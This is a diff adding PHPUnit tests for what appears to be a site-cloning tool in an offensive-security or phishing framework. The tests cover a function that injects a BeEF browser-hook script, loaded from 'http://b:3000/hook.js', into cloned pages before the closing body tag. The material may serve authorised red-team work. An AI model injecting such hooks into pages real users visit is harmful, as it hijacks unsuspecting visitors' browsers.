@@ -211,4 +211,55 @@ final class SiteClonerFiltersTest extends TestCase
         $r = clone_rewrite_html($html, 'https://t.test/');
         self::assertStringContainsString('href="javascript:void(0)"', $r['html']);
     }
+
+    // ---- Phase 3.52 task 5: BeEF hook injection -----------------------
+
+    public function testInjectHookPlacesSnippetBeforeBodyClose(): void
+    {
+        $out = site_cloner_inject_hook(
+            '<html><body>hi</body></html>',
+            '<script async src="http://b:3000/hook.js"></script>'
+        );
+        self::assertStringContainsString(
+            '<script async src="http://b:3000/hook.js"></script></body>',
+            $out
+        );
+    }
+
+    public function testInjectHookFallsBackToHtmlClose(): void
+    {
+        $out = site_cloner_inject_hook('<html>no body</html>', '<script>x</script>');
+        self::assertStringContainsString('<script>x</script></html>', $out);
+    }
+
+    public function testInjectHookAppendsWhenNoClosingTagAtAll(): void
+    {
+        $out = site_cloner_inject_hook('partial html', '<script>x</script>');
+        self::assertStringEndsWith('<script>x</script>', $out);
+    }
+
+    public function testInjectHookNoopOnEmptySnippet(): void
+    {
+        $html = '<html><body>hi</body></html>';
+        self::assertSame($html, site_cloner_inject_hook($html, ''));
+        self::assertSame($html, site_cloner_inject_hook($html, '   '));
+    }
+
+    public function testInjectHookHandlesUppercaseBodyTag(): void
+    {
+        $out = site_cloner_inject_hook('<HTML><BODY>x</BODY></HTML>', '<script>y</script>');
+        self::assertStringContainsString('<script>y</script></BODY>', $out);
+    }
+
+    public function testInjectHookOnlyHitsFirstBodyClose(): void
+    {
+        // Pathological page with </body> inside a comment + the real one.
+        $html = '<html><body>real<!-- </body> commented --></body></html>';
+        $out = site_cloner_inject_hook($html, '<script>z</script>');
+        // The injector replaces the FIRST </body> match — in this case the
+        // commented one (regex is dumb on purpose; HTML parsing is out of
+        // scope and the operator validates the rendered clone manually).
+        // Documenting the behavior so a future change doesn't surprise us.
+        self::assertSame(1, substr_count($out, '<script>z</script>'));
+    }
 }
